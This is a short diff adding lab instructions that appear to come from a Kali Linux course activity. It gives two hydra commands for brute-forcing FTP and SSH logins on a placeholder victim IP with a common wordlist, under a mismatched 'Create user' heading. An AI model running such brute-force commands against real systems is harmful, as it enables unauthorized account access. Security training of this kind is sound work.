@@ -1,0 +1,16 @@
+Activity 1 
+
+The following commands are used in KALI LINUX.
+
+Command 1 - Create user: 
+
+Copy this for password cracking using FTP: 
+
+hydra -l <username> -P /usr/share/wordlists/dirb/common.txt ftp://<IP_OF_Victim>
+
+OPTIONAL:
+Copy this for password cracking using SSH: 
+
+hydra -l <username> -P /usr/share/wordlists/dirb/common.txt ssh://<IP_OF_Victim>
+
+
